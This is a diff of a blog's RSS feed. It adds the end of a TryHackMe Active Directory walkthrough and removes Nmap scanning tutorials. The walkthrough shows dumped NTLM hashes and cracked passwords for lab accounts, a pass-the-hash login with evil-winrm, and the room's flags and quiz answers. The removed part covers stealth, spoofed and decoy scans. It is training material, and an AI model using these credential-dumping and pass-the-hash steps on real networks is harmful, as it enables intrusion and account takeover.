+spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;kidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;reakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;ames:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
+spookysec.local&lt;span class=&quot;se&quot;&gt;\o&lt;/span&gt;ptional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
+spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;herlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
+spookysec.local&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;arkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
+spookysec.local&lt;span class=&quot;se&quot;&gt;\O&lt;/span&gt;ri:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
+spookysec.local&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;obin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
+spookysec.local&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;aradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
+spookysec.local&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;uirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
+spookysec.local&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;orshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
+spookysec.local&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
+spookysec.local&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ackup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
+spookysec.local&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-spooks&lt;/span&gt;:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+ATTACKTIVEDIREC&lt;span class=&quot;nv&quot;&gt;$:&lt;/span&gt;1000:aad3b435b51404eeaad3b435b51404ee:e3a602bef4ccbcbc0c468b0dd6d50e7d:::
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Kerberos keys grabbed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;What method allowed us to dump NTDS.DIT?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;DRSUAPI&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the Administrators NTLM hash?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;0e0363213e37b94221497260b0bcb4fc&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What method of attack could allow us to authenticate as the user without the password?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Pass the Hash&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Using a tool called Evil-WinRM what option will allow us to use a hash?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm -h&lt;/code&gt; -H, –hash HASH                  NTHash&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-8---flag-submission-flag-submission-panel&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 8 - Flag Submission Flag Submission Panel&lt;/h2&gt;
+
+&lt;p&gt;Cool site: https://wadcoms.github.io/#&lt;/p&gt;
+
+&lt;p&gt;Submit the flags for each user account. They can be located on each user’s desktop.&lt;/p&gt;
+
+&lt;h5 id=&quot;answer-the-questions-below-5&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
+
+&lt;h3 id=&quot;svc-admin&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;svc-admin&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;credentials user:svc-admin pass:management2005&lt;/li&gt;
+  &lt;li&gt;TryHackMe{K3rb3r0s_Pr3_4uth}&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;backup&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;backup&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;credentials user:backup pass:backup2517860&lt;/li&gt;
+  &lt;li&gt;TryHackMe{B4ckM3UpSc0tty!}&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;administrator&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Administrator&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;credentials user:Administrator pass: We can Pass the Hash with below command.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0xskar㉿cocokali&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/thm/AttacktiveDirectory]
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.132.136 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Administrator &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 0e0363213e37b94221497260b0bcb4fc
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;TryHackMe{4ctiveD1rectoryM4st3r}&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
 </description>
         <pubDate>Mon, 20 Jun 2022 00:00:00 -0700</pubDate>
         <link>http://localhost:4000//Attacktive-Directory</link>
@@ -1566,524 +3104,6 @@ We designed this room to help you build a thorough methodology for Linux privile
         <link>http://localhost:4000//TryHackMe-Linux-PrivEsc</link>
         <link href="http://localhost:4000/TryHackMe-Linux-PrivEsc"/>
         <guid isPermaLink="true">http://localhost:4000/TryHackMe-Linux-PrivEsc</guid>
-      </item>
-    
-      <item>
-        <title>TryHackMe - Nmap Post Port Scans</title>
-        <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/nmap04&quot;&gt;https://tryhackme.com/room/nmap04&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;How to leverage Nmap for service and OS detection, use Nmap Scripting Engine (NSE), and save the results.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-1---introduction&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 1 - Introduction&lt;/h2&gt;
-
-&lt;p&gt;We will cover the following:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Detect versions of the running services (on all open ports)&lt;/li&gt;
-  &lt;li&gt;Detect the OS based on any signs revealed by the target&lt;/li&gt;
-  &lt;li&gt;Run Nmap’s traceroute&lt;/li&gt;
-  &lt;li&gt;Run select Nmap scripts&lt;/li&gt;
-  &lt;li&gt;Save the scan results in various formats&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-2---service-detection&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 2 - Service Detection&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sV&lt;/code&gt; to your Nmap command will collect and determine service and version information for the open ports.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h5 id=&quot;answer-the-questions-below&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
-
-&lt;p&gt;&lt;strong&gt;Start the target machine for this task and launch the AttackBox. Run nmap -sV –version-light 10.10.101.238 via the AttackBox. What is the detected version for port 143?&lt;/strong&gt; dovecot imapd&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Which service did not have a version detected with –version-light?&lt;/strong&gt; rpcbind&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-3---os-detection-and-traceroute&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 3 - OS Detection and Traceroute&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-O&lt;/code&gt; - Exampe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sS -O 10.10.101.238&lt;/code&gt; Nmap can decept the Operating System, based on behaviour and responses.&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--traceroute&lt;/code&gt; If you want Nmap to find the routers betwen you and the target. For example &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sS --traceroute 10.10.101.238&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h5 id=&quot;answer-the-questions-below-1&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
-
-&lt;p&gt;&lt;strong&gt;Run nmap with -O option against 10.10.101.238. What OS did Nmap detect?&lt;/strong&gt; linux&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-4---nmap-scripting-engine-nse&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 4 - Nmap Scripting Engine (NSE)&lt;/h2&gt;
-
-&lt;p&gt;Nmap default installation can easily contain close to 600 scripts. On my Kali Linux this is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/nmap/scripts&lt;/code&gt; we can run the default scripts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sC&lt;/code&gt; which is equal to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--script=default&lt;/code&gt;. We can choose different categories from the table below with this flag. Or even specific scripts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--script &quot;SCRIPT-NAME&quot;&lt;/code&gt;&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Script Category&lt;/th&gt;
-      &lt;th&gt;Description&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;auth&lt;/td&gt;
-      &lt;td&gt;Authentication related scripts&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;broadcast&lt;/td&gt;
-      &lt;td&gt;Discover hosts by sending broadcast messages&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;brute&lt;/td&gt;
-      &lt;td&gt;Performs brute-force password auditing against logins&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;default&lt;/td&gt;
-      &lt;td&gt;Default scripts, same as -sC&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;discovery&lt;/td&gt;
-      &lt;td&gt;Retrieve accessible information, such as database tables and DNS names&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;dos&lt;/td&gt;
-      &lt;td&gt;Detects servers vulnerable to Denial of Service (DoS)&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;exploit&lt;/td&gt;
-      &lt;td&gt;Attempts to exploit various vulnerable services&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;external&lt;/td&gt;
-      &lt;td&gt;Checks using a third-party service, such as Geoplugin and Virustotal&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;fuzzer&lt;/td&gt;
-      &lt;td&gt;Launch fuzzing attacks&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;intrusive&lt;/td&gt;
-      &lt;td&gt;Intrusive scripts such as brute-force attacks and exploitation&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;malware&lt;/td&gt;
-      &lt;td&gt;Scans for backdoors&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;safe&lt;/td&gt;
-      &lt;td&gt;Safe scripts that won’t crash the target&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;version&lt;/td&gt;
-      &lt;td&gt;Retrieve service versions&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;vuln&lt;/td&gt;
-      &lt;td&gt;Checks for vulnerabilities or exploit vulnerable services&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h5 id=&quot;answer-the-questions-below-2&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
-
-&lt;p&gt;&lt;strong&gt;Knowing that Nmap scripts are saved in /usr/share/nmap/scripts on the AttackBox. What does the script http-robots.txt check for?&lt;/strong&gt; disallowed entries&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Can you figure out the name for the script that checks for the remote code execution vulnerability MS15-034 (CVE2015-2015-1635)?&lt;/strong&gt; http-vuln-cve2015-1635&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Launch the AttackBox if you haven’t already. After you ensure you have terminated the VM from Task 2, start the target machine for this task. On the AttackBox, run Nmap with the default scripts -sC against 10.10.101.238. You will notice that there is a service listening on port 53. What is its full version value?&lt;/strong&gt; 9.9.5-9+deb8u19-Debian&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Based on its description, the script ssh2-enum-algos “reports the number of algorithms (for encryption, compression, etc.) that the target SSH2 server offers.” What is the name of the key exchange algorithms (kex_algorithms) that relies upon “sha1” and is supported by 10.10.101.238?&lt;/strong&gt; diffie-hellman-group14-sha1&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-5---saving-the-output&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 5 - Saving the Output&lt;/h2&gt;
-
-&lt;p&gt;The three main formats are:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Normal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oN FILENAME&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Grepable (grepable) &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oG FILENAME&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;XML &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oX FILENAME&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h5 id=&quot;answer-the-questions-below-3&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
-
-&lt;p&gt;Terminate the target machine of the previous task and start the target machine for this task. On the AttackBox terminal, issue the command scp pentester@MACHINE_IP:/home/pentester/* . to download the Nmap reports in normal and grepable formats from the target virtual machine.&lt;/p&gt;
-
-&lt;p&gt;Note that the username pentester has the password THM17577&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Check the attached Nmap logs. How many systems are listening on the HTTPS port?&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat scan_172_17_network.gnmap | grep https&lt;/code&gt; there are 3&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;What is the IP address of the system listening on port 8089?&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat scan_172_17_network.gnmap | grep 8089&lt;/code&gt; 172.17.20.147&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-6---summary&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 6 - Summary&lt;/h2&gt;
-
-&lt;p&gt;Familiarized ourselves with Nmap. Here is a list of options/flags we learned to use.&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Option&lt;/th&gt;
-      &lt;th&gt;Meaning&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;-sV&lt;/td&gt;
-      &lt;td&gt;determine service/version info on open ports&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;-sV –version-light&lt;/td&gt;
-      &lt;td&gt;try the most likely probes (2)&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;-sV –version-all&lt;/td&gt;
-      &lt;td&gt;try all available probes (9)&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;-O&lt;/td&gt;
-      &lt;td&gt;detect OS&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;–traceroute&lt;/td&gt;
-      &lt;td&gt;run traceroute to target&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;–script=SCRIPTS&lt;/td&gt;
-      &lt;td&gt;Nmap scripts to run&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;-sC or –script=default&lt;/td&gt;
-      &lt;td&gt;run default scripts&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;-A&lt;/td&gt;
-      &lt;td&gt;equivalent to -sV -O -sC –traceroute&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;-oN&lt;/td&gt;
-      &lt;td&gt;save output in normal format&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;-oG&lt;/td&gt;
-      &lt;td&gt;save output in grepable format&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;-oX&lt;/td&gt;
-      &lt;td&gt;save output in XML format&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;-oA&lt;/td&gt;
-      &lt;td&gt;save output in normal, XML and Grepable formats&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;hr /&gt;
-</description>
-        <pubDate>Thu, 16 Jun 2022 00:00:00 -0700</pubDate>
-        <link>http://localhost:4000//TryHackMe-nmap04</link>
-        <link href="http://localhost:4000/TryHackMe-nmap04"/>
-        <guid isPermaLink="true">http://localhost:4000/TryHackMe-nmap04</guid>
-      </item>
-    
-      <item>
-        <title>TryHackMe - Nmap Advanced Port Scans</title>
-        <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/nmap03&quot;&gt;https://tryhackme.com/room/nmap03&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Advanced techniques such as null, FIN, Xmas, and idle (zombie) scans, spoofing, in addition to FW and IDS evasion.&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-1---introduction&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 1 - Introduction&lt;/h2&gt;
-
-&lt;p&gt;We will cover the following types of port scans:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Null Scan&lt;/li&gt;
-  &lt;li&gt;FIN Scan&lt;/li&gt;
-  &lt;li&gt;Xmas Scan&lt;/li&gt;
-  &lt;li&gt;Maimon Scan&lt;/li&gt;
-  &lt;li&gt;ACK Scan&lt;/li&gt;
-  &lt;li&gt;Window Scan&lt;/li&gt;
-  &lt;li&gt;Custom Scan&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Moreover, we will cover the following:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Spoofing IP&lt;/li&gt;
-  &lt;li&gt;Spoofing MAC&lt;/li&gt;
-  &lt;li&gt;Decoy Scan&lt;/li&gt;
-  &lt;li&gt;Fragmented Packets&lt;/li&gt;
-  &lt;li&gt;Idle/Zombie Scan&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-2-tcp-null-scan-fin-scan-and-xmas-scan&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 2 TCP Null Scan, FIN Scan, and Xmas Scan&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sN&lt;/code&gt; Null scan - The null scan does not set any flag; all six flag bits are set to zero.&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sF&lt;/code&gt; FIN scan - The FIN scan sends a TCP packet with the FIN flag set.&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sX&lt;/code&gt; Xmas scan - An Xmas scan sets the FIN, PSH, and URG flags simultaneously.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;On scenario where these three scan types can be efficient is when scanning a target behind a stateless (non-stateful) firewall. A stateless firewall will check if the incoming packet has the SYN flag set to detect a connection attempt. Using a flag combination that does not match the SYN packet makes it possible to deceive the firewall and reach the system behind it. However, a stateful firewall will practically block all such crafted packets and render this kind of scan useless.&lt;/p&gt;
-
-&lt;h5 id=&quot;answer-the-questions-below&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
-
-&lt;p&gt;&lt;strong&gt;In a null scan, how many flags are set to 1?&lt;/strong&gt; 0&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;In a FIN scan, how many flags are set to 1?&lt;/strong&gt; 1&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;In a Xmas scan, how many flags are set to 1?&lt;/strong&gt; 3&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Start the VM and load the AttackBox. Once both are ready, open the terminal on the AttackBox and use nmap to launch a FIN scan against the target VM. How many ports appear as open/filtered?&lt;/strong&gt; 7&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;**Repeat your scan launching a null scan against the target VM. How many ports appear as open&lt;/td&gt;
-      &lt;td&gt;filtered?** 7&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-3---tcp-maimon-scan&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 3 - TCP Maimon Scan&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sM&lt;/code&gt; In this scan, the FIN and ACK bits are set. The target should send an RST packet as a response. This scan won’t work on most targets encountered in modern networks.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h5 id=&quot;answer-the-questions-below-1&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
-
-&lt;p&gt;&lt;strong&gt;In the Maimon scan, how many flags are set?&lt;/strong&gt; 2&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-4---tcp-ack-window-and-custom-scan&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 4 - TCP ACK, Window, and Custom Scan&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sA&lt;/code&gt; TCP ACK scan. As the name implies, an ACK scan will send a TCP packet with the ACK flag set. This scan won’t tell us whether the target port is open in a simple setup. This kind of scan would be helpful &lt;strong&gt;if there is a firewall in front of the target&lt;/strong&gt;.&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sW&lt;/code&gt; TCP Window scan. On specific systems, this can reveal that the port is open. Similarly, launching a TCP window scan against a Linux system with no firewall will not provide much information. However, as you would expect, if we repeat our TCP window scan against a server behind a firewall, we expect to get more satisfying results.&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-scanflags CUSTOM_FLAGS&lt;/code&gt;  if you want to set SYN, RST, and FIN simultaneously, you can do so.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;It is essential to note that the ACK scan and the window scan were very efficient at helping us map out the firewall rules. However, it is vital to remember that just because a firewall is not blocking a specific port, it does not necessarily mean that a service is listening on that port. For example, there is a possibility that the firewall rules need to be updated to reflect recent service changes. Hence, ACK and window scans are exposing the firewall rules, not the services.&lt;/p&gt;
-
-&lt;h5 id=&quot;answer-the-questions-below-2&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
-
-&lt;p&gt;&lt;strong&gt;In TCP Window scan, how many flags are set?&lt;/strong&gt; 1&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;You decided to experiment with a custom TCP scan that has the reset flag set. What would you add after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--scanflags&lt;/code&gt;?&lt;/strong&gt; RST&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;The VM received an update to its firewall ruleset. A new port is now allowed by the firewall. After you make sure that you have terminated the VM from Task 2, start the VM for this task. Launch the AttackBox if you haven’t done that already. Once both are ready, open the terminal on the AttackBox and use Nmap to launch an ACK scan against the target VM. How many ports appear unfiltered?&lt;/strong&gt; 4&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;What is the new port number that appeared?&lt;/strong&gt; 443&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Is there any service behind the newly discovered port number? (Y/N)&lt;/strong&gt; No&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;task-5---spoofing-and-decoys&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 5 - Spoofing and Decoys&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -e NET_INTERFACE -Pn -S SPOOFED_IP 10.10.141.22&lt;/code&gt; We can scan target systems with spoofed IP addresses and MAC addresses. For this scan to work and give accurate results, the attacker needs to monitor the network traffic to analyze the replies. Specify the network interface using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e&lt;/code&gt; and to explicitly disable ping scan &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-Pn&lt;/code&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;When you are on the same subnet as the target machine, you would be able to spoof your MAC address as well. You can specify the source MAC address using –spoof-mac SPOOFED_MAC. This address spoofing is only possible if the attacker and the target machine are on the same Ethernet (802.3) network or same WiFi (802.11).&lt;/p&gt;
-
-&lt;p&gt;You can launch a decoy scan by specifying a specific or random IP address -D example: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.141.22&lt;/code&gt;&lt;/p&gt;
-
-&lt;h5 id=&quot;answer-the-questions-below-3&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
-
